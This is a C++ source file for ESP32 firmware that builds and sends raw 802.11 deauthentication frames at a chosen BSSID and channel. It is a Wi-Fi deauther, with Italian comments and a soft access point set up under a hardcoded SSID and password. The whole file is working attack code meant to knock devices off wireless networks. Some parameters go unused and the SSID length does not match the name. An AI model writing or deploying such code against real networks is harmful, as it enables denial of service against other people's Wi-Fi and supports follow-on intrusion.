#include <cstring>
#include "deauth.hpp"
#include "esp_log.h"
#include <string.h>

#define TASK_NAME "spam_task"

uint16_t seqnum;
uint8_t buffer[200];

const uint8_t deauthPacket[] = {
    0xc0, 0x00, 0x3a, 0x01,  //vari header tipo pacchetto c0 -> deauth wifi frame
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, //broadcast default
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //bssid del target
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //bssid del target
    0xf0, 0xff, 0x06, 0x00 //reason code sss
};

esp_err_t deauth(const MacAddr target, const MacAddr source,
        const MacAddr bssid, uint8_t reason, uint8_t channel) {
    
    esp_err_t res = esp32_deauther_configure_wifi(channel);

    memcpy(buffer, deauthPacket, sizeof(deauthPacket));

    memcpy(&buffer[10], bssid , 6);
    memcpy(&buffer[16], bssid, 6);

    seqnum++;
    for(int i=0; i<sizeof(deauthPacket);i++){
        ESP_LOGI(TASK_NAME, "packet byte %d:  %x ", i, buffer[i]);
    }

    res = raw(buffer, sizeof(deauthPacket), false);
    ESP_LOGI(TASK_NAME, "result: %s", esp_err_to_name(res));

    return res;
    
}

esp_err_t raw(const uint8_t* packet, int32_t len, bool en_sys_seq) {
    return esp_wifi_80211_tx(WIFI_IF_AP, packet, len, en_sys_seq);
}

esp_err_t esp32_deauther_configure_wifi(uint8_t channel){
    wifi_config_t ap_config = {};
    strcpy((char*)ap_config.ap.ssid,"Prosciutto wifi");
    ap_config.ap.ssid_len = 10;
    strcpy((char*)ap_config.ap.password,"prosciutto_w");
    ap_config.ap.channel = channel;
    ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK,
    ap_config.ap.ssid_hidden = 0;
    ap_config.ap.max_connection = 4;
    ap_config.ap.beacon_interval = 60000;

    return esp_wifi_set_config(WIFI_IF_AP, &ap_config);
}

/*
esp_err_t PacketSender::change_channel(uint8_t channel) {
    return esp32_deauther_configure_wifi(channel);
}
*/



